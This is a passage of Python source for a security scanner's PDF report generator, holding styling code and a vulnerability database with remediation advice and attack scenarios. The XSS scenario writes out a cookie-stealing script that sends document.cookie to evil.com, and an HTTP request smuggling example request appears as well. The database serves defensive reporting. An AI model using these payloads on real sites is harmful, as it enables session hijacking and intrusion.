# modules/reporting/professional_pdf_generator.py
"""
Gecko Apocalypse - Enterprise-Grade PDF Report Generator
Professional security assessment reports with detailed analysis,
business impact assessment, and actionable remediation guidance.

FIXES APPLIED:
1. Footer rendering via lambda in doc.build()
2. NumberedCanvas for accurate page numbering
3. Dynamic pagesize derivation instead of hardcoded values
4. _create_cvss_gauge returns Paragraph object directly
5. Finding deduplication by (title, url) key
6. Extended VULNERABILITY_DATABASE with 5 additional vulnerability types
7. Attack scenario section added to finding cards
8. Affected assets rendering in detailed findings
9. Smart page breaks based on severity level
"""

import asyncio
import json
import logging
import os
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Any, Optional, Tuple, Set
from reportlab.lib import colors
from reportlab.lib.pagesizes import A4, letter
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.units import inch, cm
from reportlab.platypus import (
    SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle,
    PageBreak, Image, ListFlowable, ListItem, HRFlowable, Preformatted,
    KeepTogether, Frame, PageTemplate, BaseDocTemplate
)
from reportlab.pdfgen import canvas
from reportlab.lib.enums import TA_CENTER, TA_LEFT, TA_JUSTIFY
import markdown
from collections import Counter

logger = logging.getLogger("gecko.reporting.professional")


# ============================================================================
# FIX #2: NumberedCanvas for accurate page numbering
# ============================================================================
class NumberedCanvas(canvas.Canvas):
    """Canvas subclass that tracks page state for accurate header/footer rendering"""
    
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._saved_page_states = []
        self._header_footer_callback = None

    def set_header_footer_callback(self, callback):
        """Set the callback for drawing header/footer chrome"""
        self._header_footer_callback = callback

    def showPage(self):
        """Save the state of the current page"""
        self._saved_page_states.append(dict(self.__dict__))
        self._startPage()

    def save(self):
        """Save the document and draw headers/footers on all pages"""
        num_pages = len(self._saved_page_states)
        for page_num, state in enumerate(self._saved_page_states, 1):
            self.__dict__.update(state)
            if self._header_footer_callback:
                self._header_footer_callback(self, page_num, num_pages)
            canvas.Canvas.showPage(self)
        canvas.Canvas.save(self)


@dataclass
class VulnerabilityDetails:
    """Detailed vulnerability information with context"""
    title: str
    severity: str
    cvss_score: float
    cvss_vector: str
    cwe_id: str
    cwe_name: str
    owasp_category: str
    url: str
    location: str
    parameter: Optional[str]
    method: str
    description: str
    technical_details: str
    root_cause: str
    business_impact: str
    affected_assets: List[str]
    evidence: List[Dict[str, Any]]
    proof_of_concept: str
    remediation_steps: List[str]
    remediation_code: Optional[str]
    references: List[str]
    compliance_impact: List[str]
    likelihood: str
    exploitability: str
    time_to_exploit: str
    detected_at: datetime
    false_positive_probability: float


class ProfessionalPDFGenerator:
    """
    Enterprise-grade PDF generator with comprehensive vulnerability analysis
    and executive-level reporting suitable for CISO/CTO presentations.
    """
    
    SEVERITY_CONFIG = {
        "CRITICAL": {
            "color": colors.HexColor("#8B0000"),
            "bg_color": colors.HexColor("#FFE6E6"),
            "priority": 1,
            "sla": "24 hours",
            "risk_rating": "Unacceptable"
        },
        "HIGH": {
            "color": colors.HexColor("#DC143C"),
            "bg_color": colors.HexColor("#FFF0F0"),
            "priority": 2,
            "sla": "7 days",
            "risk_rating": "High"
        },
        "MEDIUM": {
            "color": colors.HexColor("#FF8C00"),
            "bg_color": colors.HexColor("#FFF8DC"),
            "priority": 3,
            "sla": "30 days",
            "risk_rating": "Moderate"
        },
        "LOW": {
            "color": colors.HexColor("#4169E1"),
            "bg_color": colors.HexColor("#F0F8FF"),
            "priority": 4,
            "sla": "90 days",
            "risk_rating": "Low"
        },
        "INFO": {
            "color": colors.HexColor("#708090"),
            "bg_color": colors.HexColor("#F5F5F5"),
            "priority": 5,
            "sla": "Next release",
            "risk_rating": "Informational"
        }
    }
    
    # FIX #6: Extended VULNERABILITY_DATABASE with additional vulnerability types
    VULNERABILITY_DATABASE = {
        "sql_injection": {
            "name": "SQL Injection",
            "description": "SQL injection is a code injection technique that exploits security vulnerabilities in an application's database layer. It occurs when user input is incorrectly filtered or not strongly typed and unexpectedly executed as SQL commands.",
            "impact": "Attackers can bypass authentication, access, modify, or delete database contents, execute administrative operations, and in some cases issue commands to the operating system.",
            "remediation": [
                "Use parameterized queries (prepared statements) for all database operations",
                "Implement stored procedures with parameterized inputs",
                "Apply the principle of least privilege to database accounts",
                "Implement input validation using allowlists",
                "Use an ORM (Object-Relational Mapping) framework",
                "Escape all user-supplied input",
                "Deploy a Web Application Firewall (WAF)"
            ],
            "code_example": """# VULNERABLE CODE:
cursor.execute(f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'")

# SECURE CODE:
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))""",
            "attack_scenario": "1. Attacker identifies input field that interacts with database\n2. Injects SQL metacharacters (', --, UNION SELECT) to test for vulnerability\n3. Confirms injection via error messages or time delays\n4. Extracts database schema using information_schema queries\n5. Dumps sensitive tables (users, credentials, transactions)\n6. Escalates to OS command execution if database user has elevated privileges",
            "references": [
                "https://owasp.org/www-community/Attacks/SQL_Injection",
                "https://cwe.mitre.org/data/definitions/89.html",
                "https://portswigger.net/web-security/sql-injection"
            ]
        },
        "xss": {
            "name": "Cross-Site Scripting (XSS)",
            "description": "Cross-site scripting (XSS) is a type of security vulnerability typically found in web applications. XSS enables attackers to inject client-side scripts into web pages viewed by other users.",
            "impact": "Attackers can steal session cookies, deface websites, redirect users to malicious sites, capture keystrokes, and perform actions on behalf of users.",
            "remediation": [
                "Encode output data before rendering in the browser",
                "Implement Content Security Policy (CSP) headers",
                "Use HTTPOnly and Secure flags on cookies",
                "Validate and sanitize all user input",
                "Use modern frameworks that automatically escape XSS",
                "Implement proper Context-Aware Output Encoding"
            ],
            "code_example": """# VULNERABLE CODE:
response.write("<div>" + userInput + "</div>")

# SECURE CODE:
import html
response.write("<div>" + html.escape(userInput) + "</div>")""",
            "attack_scenario": "1. Attacker identifies user-controllable output reflected in HTML\n2. Crafts payload with JavaScript: <script>document.location='https://evil.com?c='+document.cookie</script>\n3. Delivers payload via URL parameter, form input, or stored comment\n4. Victim visits malicious link or page\n5. Attacker receives stolen session cookie\n6. Attacker hijacks victim's authenticated session",
            "references": [
                "https://owasp.org/www-community/attacks/xss/",
                "https://cwe.mitre.org/data/definitions/79.html"
            ]
        },
        "csrf": {
            "name": "Cross-Site Request Forgery (CSRF)",
            "description": "CSRF is an attack that forces an end user to execute unwanted actions on a trusted web application where they're currently authenticated.",
            "impact": "Attackers can perform state-changing operations like password changes, fund transfers, or purchase transactions without user consent.",
            "remediation": [
                "Implement anti-CSRF tokens for all state-changing operations",
                "Use SameSite cookie attribute",
                "Require re-authentication for sensitive operations",
                "Implement custom request headers",
                "Use double-submit cookie pattern"
            ],
            "attack_scenario": "1. Attacker crafts malicious HTML form or image tag pointing to target endpoint\n2. Victim, while authenticated to target site, visits attacker-controlled page\n3. Browser automatically includes authentication cookies with forged request\n4. Target application processes request as legitimate user action\n5. Attacker achieves unauthorized state change (password reset, fund transfer, etc.)",
            "references": [
                "https://owasp.org/www-community/attacks/csrf",
                "https://cwe.mitre.org/data/definitions/352.html"
            ]
        },
        # FIX #6: New entry for HTTP Request Smuggling
        "http_request_smuggling": {
            "name": "HTTP Request Smuggling",
            "description": "HTTP request smuggling is a technique for interfering with the way a web server processes sequences of HTTP requests that are received from another party (such as a client or a backend server). It exploits discrepancies in how front-end and back-end servers parse HTTP requests, particularly around Content-Length and Transfer-Encoding headers.",
            "impact": "Successful smuggling attacks can bypass security controls, poison web caches, hijack user sessions, and expose sensitive request data. CL.TE and TE.CL desync variants allow attackers to inject arbitrary requests that appear to originate from other users.",
            "remediation": [
                "Disable HTTP/1.0 support and require HTTP/1.1 with strict parsing",
                "Reject requests containing both Content-Length and Transfer-Encoding headers",
                "Ensure front-end and back-end servers use consistent HTTP parsing logic",
                "Implement request normalization at the load balancer or WAF",
                "Use HTTP/2 end-to-end where possible to eliminate parsing ambiguities",
                "Monitor for unusual request patterns and response anomalies"
            ],
            "code_example": """# VULNERABLE: Inconsistent parsing between proxies
# Front-end interprets Content-Length, back-end interprets Transfer-Encoding

POST /transfer HTTP/1.1
Content-Length: 13
Transfer-Encoding: chunked

0

GET /evil HTTP/1.1
X: X

# SECURE: Reject ambiguous headers at ingress
if request.headers.get('Content-Length') and request.headers.get('Transfer-Encoding'):
    return HttpResponse(400, "Ambiguous transfer encoding")""",
            "attack_scenario": "1. Attacker identifies front-end/back-end parsing discrepancy via header fuzzing\n2. Crafts request with conflicting Content-Length and Transfer-Encoding headers\n3. Front-end server processes first request, back-end interprets remainder as new request\n4. Smuggled request is processed as if from next legitimate user\n5. Attacker achieves session hijacking, cache poisoning, or WAF bypass",
            "references": [
                "https://portswigger.net/web-security/request-smuggling",
                "https://cwe.mitre.org/data/definitions/444.html",
                "https://www.rfc-editor.org/rfc/rfc9112#name-message-body-length"
            ]
        },
        # FIX #6: New entry for Missing Security Headers
        "missing_security_header": {
            "name": "Missing Security Headers",
            "description": "The application fails to implement critical HTTP security headers that protect users from common web attacks. Each missing header enables specific attack vectors: CSP prevents XSS, HSTS prevents SSL stripping, X-Frame-Options prevents clickjacking, etc.",
            "impact": "Missing headers amplify other vulnerabilities and enable standalone attacks: clickjacking via missing X-Frame-Options, XSS amplification via missing CSP, protocol downgrade via missing HSTS, MIME-type confusion via missing X-Content-Type-Options.",
            "remediation": [
                "Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'",
                "Strict-Transport-Security: max-age=31536000; includeSubDomains; preload",
                "X-Frame-Options: DENY or SAMEORIGIN",
                "X-Content-Type-Options: nosniff",
                "Referrer-Policy: strict-origin-when-cross-origin",
                "Permissions-Policy: geolocation=(), microphone=(), camera=()",
                "Deploy headers via reverse proxy or application middleware"
            ],
            "code_example": """# SECURE: Flask middleware example
@app.after_request
def set_security_headers(response):
    response.headers['Content-Security-Policy'] = "default-src 'self'"
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    return response""",
            "attack_scenario": "1. Attacker identifies missing X-Frame-Options header\n2. Embeds target page in hidden iframe on malicious site\n3. Overlays transparent click-jacking layer on top of legitimate UI\n4. Victim clicks believing they interact with legitimate site\n5. Attacker triggers unauthorized actions (fund transfer, password change) via victim's authenticated session",
            "references": [
                "https://owasp.org/www-project-secure-headers/",
                "https://cwe.mitre.org/data/definitions/693.html",
                "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers"
            ]
        },
        # FIX #6: New entry for Username Enumeration via Timing
        "username_enumeration_timing": {
            "name": "Username Enumeration via Timing Side-Channel",
            "description": "The authentication endpoint leaks information about valid usernames through measurable differences in response time. When a valid username is provided, the system performs additional cryptographic operations (password hashing, MFA checks) that take measurably longer than rejecting an invalid username.",
            "impact": "Attackers can enumerate valid usernames with high accuracy, enabling targeted credential stuffing, password spraying, and social engineering attacks. Combined with breached password lists, this significantly increases account takeover risk.",
            "remediation": [
                "Use constant-time comparison for username lookups: hmac.compare_digest()",
                "Implement uniform response timing via artificial delays for invalid usernames",
                "Return identical HTTP status codes and response bodies for valid/invalid usernames",
                "Implement rate limiting and account lockout to deter enumeration attempts",
                "Monitor for high-volume authentication requests from single sources"
            ],
            "code_example": """# VULNERABLE: Timing leak via early return
def authenticate(username, password):
    user = db.query(User).filter_by(username=username).first()
    if not user:  # Returns immediately for invalid username
        return False
    return check_password(user.password_hash, password)  # Takes time for valid username

# SECURE: Constant-time comparison
import hmac
def authenticate(username, password):
    user = db.query(User).filter_by(username=username).first()
    # Always perform password check, even for invalid users
    dummy_hash = bcrypt.gensalt()
    target_hash = user.password_hash if user else dummy_hash
    # Constant-time comparison prevents timing leak
    hmac.compare_digest(bcrypt.hashpw(password.encode(), target_hash), target_hash)
    return user is not None and check_password(user.password_hash, password)""",
            "attack_scenario": "1. Attacker sends authentication requests with common usernames (admin, user, test)\n2. Measures response time for each request with millisecond precision\n3. Clusters responses: fast (~50ms) = invalid username, slow (~200ms) = valid username\n4. Compiles list of valid usernames from slow responses\n5. Uses valid usernames in credential stuffing attacks with breached password lists\n6. Achieves account takeover for users with weak or reused passwords",
            "references": [
                "https://cwe.mitre.org/data/definitions/208.html",
                "https://blog.doyensec.com/2023/03/16/timing-attacks.html",
                "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
            ]
        },
        # FIX #6: New entry for Server Version Disclosure
        "server_version_disclosure": {
            "name": "Server Version Disclosure",
            "impact": "Exposing server software and version enables attackers to identify known CVEs affecting that specific version, dramatically reducing the effort required for successful exploitation. Attackers can automate CVE lookup and exploit deployment against disclosed versions.",
            "description": "The web server or application framework includes version information in HTTP response headers (Server, X-Powered-By) or error pages, allowing attackers to identify the exact software versions in use.",
            "remediation": [
                "Configure web server to suppress version headers: ServerTokens Prod (Apache), server_tokens off (Nginx)",
                "Remove or obfuscate X-Powered-By, X-AspNet-Version, and similar headers",
                "Implement custom error pages that do not leak stack traces or version info",
                "Use a reverse proxy to normalize and sanitize outbound headers",
                "Regularly update server software to mitigate known CVEs regardless of disclosure"
            ],
            "code_example": """# NGINX: Suppress version in nginx.conf
http {
    server_tokens off;
    # Remove X-Powered-By if proxying to app server
    proxy_hide_header X-Powered-By;
}

# APACHE: In httpd.conf or .htaccess
ServerTokens Prod
ServerSignature Off
Header unset X-Powered-By

# EXPRESS (Node.js): Remove headers in app.js
app.disable('x-powered-by');
app.use((req, res, next) => {
    res.removeHeader('Server');
    next();
});""",
            "attack_scenario": "1. Attacker sends request to target and observes Server: nginx/1.18.0 header\n2. Queries CVE databases for nginx 1.18.0 vulnerabilities\n3. Identifies CVE-2021-23017 (DNS resolver off-by-one heap overflow)\n4. Crafts malicious DNS response to trigger heap corruption\n5. Achieves remote code execution on server with nginx worker privileges\n6. Escalates to full system compromise via local privilege escalation",
            "references": [
                "https://cwe.mitre.org/data/definitions/200.html",
                "https://nginx.org/en/docs/http/ngx_http_core_module.html#server_tokens",
                "https://httpd.apache.org/docs/2.4/mod/core.html#servertokens"
            ]
        },
        # FIX #6: New entry for Discovered Endpoints
        "discovered_endpoints": {
            "name": "Unauthenticated Access to Sensitive Endpoints",
            "description": "Automated discovery identified API endpoints, administrative interfaces, or debugging endpoints that are accessible without authentication. These endpoints may expose sensitive data, administrative functions, or internal application state.",
            "impact": "Unauthenticated endpoints can leak sensitive configuration data, user information, or internal API functionality. Attackers can enumerate application structure, extract PII, manipulate business logic, or access administrative functions without credentials.",
            "remediation": [
                "Implement authentication and authorization checks on all endpoints",
                "Use API gateways with centralized access control policies",
                "Remove or disable debugging/development endpoints in production",
                "Implement network-level access controls for administrative interfaces",
                "Apply the principle of least privilege to all API endpoints",
                "Conduct regular endpoint inventory and access review"
            ],
            "code_example": """# VULNERABLE: Endpoint without auth check
@app.route('/api/internal/users')
def list_users():
    return jsonify(db.query(User).all())  # No authentication!

# SECURE: Enforce authentication decorator
from functools import wraps
def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get('Authorization')
        if not validate_token(token):
            return jsonify({'error': 'Unauthorized'}), 401
        return f(*args, **kwargs)
    return decorated

@app.route('/api/internal/users')
@require_auth
def list_users():
    return jsonify(db.query(User).all())""",
            "attack_scenario": "1. Attacker uses directory brute-forcing or JS bundle analysis to discover /api/internal/debug endpoint\n2. Sends unauthenticated GET request to discovered endpoint\n3. Endpoint returns database configuration, API keys, or user list\n4. Attacker extracts credentials or PII from response\n5. Uses extracted data for further attacks (credential stuffing, phishing, direct database access)",
            "references": [
                "https://cwe.mitre.org/data/definitions/284.html",
                "https://owasp.org/www-project-api-security/",
                "https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html"
            ]
        }
    }
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.styles = getSampleStyleSheet()
        self._register_custom_styles()
        self.report_metadata = {}
        
    def _register_custom_styles(self):
        """Register professional typography styles"""
        # Title styles
        self.styles.add(ParagraphStyle(
            name='GeoTitle',
            parent=self.styles['Heading1'],
            fontSize=28,
            spaceAfter=30,
            textColor=colors.HexColor('#1a1a2e'),
            alignment=TA_CENTER,
            fontName='Helvetica-Bold',
            borderWidth=0,
            borderColor=colors.HexColor('#16213e'),
            borderPadding=10,
            borderRadius=5
        ))
        
        # Section headers
        self.styles.add(ParagraphStyle(
            name='GeoSectionHeader',
            parent=self.styles['Heading2'],
            fontSize=18,
            spaceAfter=20,
            spaceBefore=15,
            textColor=colors.HexColor('#0f3460'),
            fontName='Helvetica-Bold',
            borderWidth=1,
            borderColor=colors.HexColor('#e94560'),
            borderPadding=8,
            leftIndent=0
        ))
        
        # Subsection headers
        self.styles.add(ParagraphStyle(
            name='GeoSubSection',
            parent=self.styles['Heading3'],
            fontSize=14,
            spaceAfter=12,
            spaceBefore=10,
            textColor=colors.HexColor('#1a1a2e'),
            fontName='Helvetica-Bold'
        ))
        
        # Finding title with severity
        self.styles.add(ParagraphStyle(
            name='GeoFindingTitle',
            parent=self.styles['Normal'],
            fontSize=16,
            spaceAfter=10,
            fontName='Helvetica-Bold',
            textColor=colors.HexColor('#8B0000')
        ))
        
        # Body text with justification
        self.styles.add(ParagraphStyle(
            name='GeoBody',
            parent=self.styles['Normal'],
            fontSize=11,
            alignment=TA_JUSTIFY,
            spaceAfter=8,
            leading=14
        ))
        
        # Code blocks
        self.styles.add(ParagraphStyle(
            name='GeoCode',
            parent=self.styles['Code'],
            fontSize=9,
            backColor=colors.HexColor('#2d3436'),
            textColor=colors.HexColor('#dfe6e9'),
            borderWidth=1,
            borderColor=colors.HexColor('#636e72'),
            borderPadding=10,
            spaceAfter=15,
            fontName='Courier'
        ))
        
        # Highlight box
        self.styles.add(ParagraphStyle(
            name='GeoHighlight',
            parent=self.styles['Normal'],
            fontSize=11,
            backColor=colors.HexColor('#FFF3CD'),
            borderWidth=1,
            borderColor=colors.HexColor("#FFC107"),
            borderPadding=8,
            spaceAfter=12,
            leftIndent=10,
            rightIndent=10
        ))
        
        # Impact box
        self.styles.add(ParagraphStyle(
            name='GeoImpact',
            parent=self.styles['Normal'],
            fontSize=11,
            backColor=colors.HexColor("#FFE6E6"),
            borderWidth=1,
            borderColor=colors.HexColor("#DC143C"),
            borderPadding=8,
            spaceAfter=12,
            leftIndent=10,
            rightIndent=10,
            textColor=colors.HexColor("#8B0000")
        ))
        
        # Remediation box
        self.styles.add(ParagraphStyle(
            name='GeoRemediation',
            parent=self.styles['Normal'],
            fontSize=11,
            backColor=colors.HexColor("#E6FFE6"),
            borderWidth=1,
            borderColor=colors.HexColor("#28A745"),
            borderPadding=8,
            spaceAfter=12,
            leftIndent=10,
            rightIndent=10,
            textColor=colors.HexColor("#006400")
        ))
        
        # Table header
        self.styles.add(ParagraphStyle(
            name='GeoTableHeader',
            parent=self.styles['Normal'],
            fontSize=11,
            fontName='Helvetica-Bold',
            textColor=colors.white,
            alignment=TA_CENTER
        ))
        
        # Table cell
        self.styles.add(ParagraphStyle(
            name='GeoTableCell',
            parent=self.styles['Normal'],
            fontSize=10,
            alignment=TA_LEFT,
            spaceAfter=5
        ))
    
    # FIX #4: Return Paragraph object directly instead of raw HTML string
    def _create_cvss_gauge(self, score: float) -> Paragraph:
        """Create a visual CVSS score representation as a proper Paragraph object"""
        if score >= 9.0:
            color, label = "#8B0000", "Critical"
        elif score >= 7.0:
            color, label = "#DC143C", "High"
        elif score >= 4.0:
            color, label = "#FF8C00", "Medium"
        elif score > 0:
            color, label = "#4169E1", "Low"
        else:
            color, label = "#708090", "None"

        style = ParagraphStyle(
            "cvss", 
            parent=self.styles["Normal"],
            alignment=TA_CENTER, 
            fontSize=18,
            textColor=colors.HexColor(color), 
            fontName="Helvetica-Bold"
        )
        return Paragraph(f"{score:.1f}<br/><font size='10'>{label}</font>", style)
    
    def _create_severity_badge(self, severity: str) -> Table:
        """Create a colored severity badge"""
        config = self.SEVERITY_CONFIG.get(severity.upper(), self.SEVERITY_CONFIG["INFO"])
        
        badge_data = [[Paragraph(f"● {severity.upper()}", self.styles['GeoTableCell'])]]
        badge_table = Table(badge_data, colWidths=[1.5*inch])
        badge_table.setStyle(TableStyle([
            ('BACKGROUND', (0, 0), (-1, -1), config['bg_color']),
            ('TEXTCOLOR', (0, 0), (-1, -1), config['color']),
            ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
            ('FONTNAME', (0, 0), (-1, -1), 'Helvetica-Bold'),
            ('FONTSIZE', (0, 0), (-1, -1), 12),
            ('BOTTOMPADDING', (0, 0), (-1, -1), 8),
            ('TOPPADDING', (0, 0), (-1, -1), 8),
            ('ROUNDEDCORNERS', [5]),
        ]))
        return badge_table
    
    def _build_executive_summary(self, findings: List[VulnerabilityDetails], duplicates_removed: int = 0) -> List:
        """Build comprehensive executive summary with metrics"""
        story = []
        
        # Executive Summary Header
        story.append(Paragraph("EXECUTIVE SUMMARY", self.styles['GeoSectionHeader']))
        story.append(Spacer(1, 0.2*inch))
        
        # Calculate metrics
        total_findings = len(findings)
        severity_counts = Counter(f.severity.upper() for f in findings)
        critical_count = severity_counts.get('CRITICAL', 0)
        high_count = severity_counts.get('HIGH', 0)
        medium_count = severity_counts.get('MEDIUM', 0)
        
        # Overall risk assessment
        if critical_count > 0:
            overall_risk = "CRITICAL"
            risk_color = "#8B0000"
            risk_message = (
                f"This assessment has identified <b>{critical_count} critical</b> and "
                f"<b>{high_count} high-severity</b> vulnerabilities that pose an immediate threat "
                f"to the confidentiality, integrity, and availability of your systems. "
                f"<b>Immediate remediation is required</b> to prevent potential data breach, "
                f"financial loss, or reputational damage."
            )
        elif high_count > 0:
            overall_risk = "HIGH"
            risk_color = "#DC143C"
            risk_message = (
                f"The assessment revealed <b>{high_count} high-severity</b> vulnerabilities "
                f"that could be exploited by attackers to gain unauthorized access or compromise "
                f"sensitive data. <b>Prioritized remediation within 7 days is strongly recommended.</b>"
            )
        elif medium_count > 0:
            overall_risk = "MEDIUM"
            risk_color = "#FF8C00"
            risk_message = (
                f"Several <b>medium-severity</b> vulnerabilities were identified that could "
                f"potentially be chained together to create more serious security issues. "
                f"Remediation within 30 days is advised."
            )
        else:
            overall_risk = "LOW"
            risk_color = "#4169E1"
            risk_message = (
                f"The assessment found primarily low-severity issues and informational findings. "
                f"Your security posture is relatively strong, but continuous improvement is recommended."
            )
        
        # Risk summary box
        risk_summary = f"""<font size="14" color="{risk_color}"><b>Overall Security Risk: {overall_risk}</b></font>
        <br/><br/>
        <font size="11">{risk_message}</font>"""
        
        story.append(Paragraph(risk_summary, self.styles['GeoHighlight']))
        story.append(Spacer(1, 0.3*inch))
        
        # Key metrics table
        metrics_data = [
            [
                Paragraph("Total Findings", self.styles['GeoTableHeader']),
                Paragraph("Critical", self.styles['GeoTableHeader']),
                Paragraph("High", self.styles['GeoTableHeader']),
                Paragraph("Medium", self.styles['GeoTableHeader']),
                Paragraph("Low/Info", self.styles['GeoTableHeader']),
            ],
            [
                Paragraph(str(total_findings), self.styles['GeoTableCell']),
                Paragraph(str(critical_count), self.styles['GeoTableCell']),
                Paragraph(str(high_count), self.styles['GeoTableCell']),
                Paragraph(str(medium_count), self.styles['GeoTableCell']),
                Paragraph(str(severity_counts.get('LOW', 0) + severity_counts.get('INFO', 0)), 
                         self.styles['GeoTableCell']),
            ]
        ]
        
        metrics_table = Table(metrics_data, colWidths=[1.2*inch, 0.9*inch, 0.9*inch, 0.9*inch, 0.9*inch])
        metrics_table.setStyle(TableStyle([
            ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor('#1a1a2e')),
            ('TEXTCOLOR', (0, 0), (-1, 0), colors.white),
            ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
            ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
            ('FONTSIZE', (0, 0), (-1, -1), 11),
            ('BOTTOMPADDING', (0, 0), (-1, -1), 12),
            ('TOPPADDING', (0, 0), (-1, -1), 12),
            ('BACKGROUND', (0, 1), (-1, 1), colors.HexColor('#f8f9fa')),
            ('GRID', (0, 0), (-1, -1), 1, colors.HexColor('#dee2e6')),
        ]))
        
        story.append(metrics_table)
        story.append(Spacer(1, 0.3*inch))
        
        # FIX #5: Report deduplication in executive summary
        if duplicates_removed > 0:
            dedup_note = f"<para fontSize='10' textColor='gray'><i>Note: {duplicates_removed} duplicate findings were consolidated to improve report clarity.</i></para>"
            story.append(Paragraph(dedup_note, self.styles['GeoBody']))
            story.append(Spacer(1, 0.1*inch))
        
        # Key findings summary
        story.append(Paragraph("Key Findings Overview", self.styles['GeoSubSection']))
        
        # Group by type
        findings_by_type = Counter(f.title for f in findings)
        for vuln_type, count in findings_by_type.most_common(5):
            vuln_info = self.VULNERABILITY_DATABASE.get(vuln_type.lower().replace(' ', '_'), {})
            story.append(Paragraph(
                f"• <b>{vuln_type}</b>: {count} instance(s) detected - {vuln_info.get('impact', 'Security risk identified')[:100]}...",
                self.styles['GeoBody']
            ))
        
        story.append(Spacer(1, 0.2*inch))
        
        # Compliance impact
        compliance_findings = set()
        for f in findings:
            compliance_findings.update(f.compliance_impact)
        
        if compliance_findings:
            story.append(Paragraph("Regulatory Compliance Impact", self.styles['GeoSubSection']))
            compliance_text = ", ".join(sorted(compliance_findings))
            story.append(Paragraph(
                f"The identified vulnerabilities may impact compliance with: <b>{compliance_text}</b>. "
                f"Remediation is necessary to maintain regulatory compliance and avoid potential penalties.",
                self.styles['GeoBody']
            ))
        
        story.append(PageBreak())
        return story
    
    def _build_detailed_finding(self, finding: VulnerabilityDetails, index: int) -> List:
        """Build comprehensive finding with full technical details"""
        story = []
        
        # Finding header with number and severity
        header_table_data = [[
            self._create_severity_badge(finding.severity),
            Paragraph(f"Finding #{index}", self.styles['GeoTableCell'])
        ]]
        header_table = Table(header_table_data, colWidths=[1.5*inch, 4*inch])
        header_table.setStyle(TableStyle([
            ('VALIGN', (0, 0), (-1, -1), 'MIDDLE'),
        ]))
        story.append(header_table)
        story.append(Spacer(1, 0.1*inch))
        
        # Finding title
        story.append(Paragraph(finding.title, self.styles['GeoFindingTitle']))
        story.append(Spacer(1, 0.15*inch))
        
        # Key metadata table
        # FIX #4: Use Paragraph object directly from _create_cvss_gauge
        cvss_gauge = self._create_cvss_gauge(finding.cvss_score)
        
        meta_data = [
            [
                Paragraph("<b>CVSS Score</b>", self.styles['GeoTableCell']),
                Paragraph("<b>CWE</b>", self.styles['GeoTableCell']),
                Paragraph("<b>OWASP Category</b>", self.styles['GeoTableCell']),
                Paragraph("<b>Remediation SLA</b>", self.styles['GeoTableCell']),
            ],
            [
                cvss_gauge,  # FIX #4: Already a Paragraph object, don't wrap again
                Paragraph(f"{finding.cwe_id}<br/>{finding.cwe_name}", self.styles['GeoTableCell']),
                Paragraph(finding.owasp_category, self.styles['GeoTableCell']),
                Paragraph(self.SEVERITY_CONFIG.get(finding.severity.upper(), {}).get('sla', 'N/A'), 
                         self.styles['GeoTableCell']),
            ]
        ]
        
        meta_table = Table(meta_data, colWidths=[1.2*inch, 1.5*inch, 1.8*inch, 1.2*inch])
        meta_table.setStyle(TableStyle([
            ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor('#0f3460')),
            ('TEXTCOLOR', (0, 0), (-1, 0), colors.white),
            ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
            ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
            ('FONTSIZE', (0, 0), (-1, -1), 10),
            ('BOTTOMPADDING', (0, 0), (-1, -1), 10),
            ('TOPPADDING', (0, 0), (-1, -1), 10),
            ('BACKGROUND', (0, 1), (-1, 1), colors.HexColor('#f8f9fa')),
            ('GRID', (0, 0), (-1, -1), 1, colors.HexColor('#dee2e6')),
            ('VALIGN', (0, 0), (-1, -1), 'MIDDLE'),
        ]))
        
        story.append(meta_table)
        story.append(Spacer(1, 0.25*inch))
        
        # Location details
        story.append(Paragraph("Affected Resource", self.styles['GeoSubSection']))
        location_table = Table([
            ["URL", finding.url],
            ["Parameter", finding.parameter or "N/A"],
            ["HTTP Method", finding.method],
            ["Location", finding.location],
        ], colWidths=[1.5*inch, 4.2*inch])
        location_table.setStyle(TableStyle([
            ('BACKGROUND', (0, 0), (0, -1), colors.HexColor('#f8f9fa')),
            ('FONTNAME', (0, 0), (0, -1), 'Helvetica-Bold'),
            ('FONTSIZE', (0, 0), (-1, -1), 10),
            ('BOTTOMPADDING', (0, 0), (-1, -1), 8),
            ('TOPPADDING', (0, 0), (-1, -1), 8),
            ('GRID', (0, 0), (-1, -1), 1, colors.HexColor('#dee2e6')),
            ('VALIGN', (0, 0), (-1, -1), 'TOP'),
        ]))
        story.append(location_table)
        story.append(Spacer(1, 0.25*inch))
        
        # FIX #8: Render affected_assets field (Limited to 10 to conserve space)
        if finding.affected_assets:
            story.append(Paragraph("Affected Assets", self.styles['GeoSubSection']))
            display_limit = 10
            for asset in finding.affected_assets[:display_limit]:
                story.append(Paragraph(f"• {asset}", self.styles['GeoBody']))
            
            if len(finding.affected_assets) > display_limit:
                omitted_count = len(finding.affected_assets) - display_limit
                story.append(Paragraph(f"<i>... and {omitted_count} more endpoint(s)</i>", self.styles['GeoBody']))
                
            story.append(Spacer(1, 0.15*inch))
        
        # Detailed Description
        story.append(Paragraph("Vulnerability Description", self.styles['GeoSubSection']))
        story.append(Paragraph(finding.description, self.styles['GeoBody']))
        story.append(Spacer(1, 0.15*inch))
        
        # Technical Details
        story.append(Paragraph("Technical Analysis", self.styles['GeoSubSection']))
        story.append(Paragraph(finding.technical_details, self.styles['GeoBody']))
        story.append(Spacer(1, 0.15*inch))
        
        # Root Cause
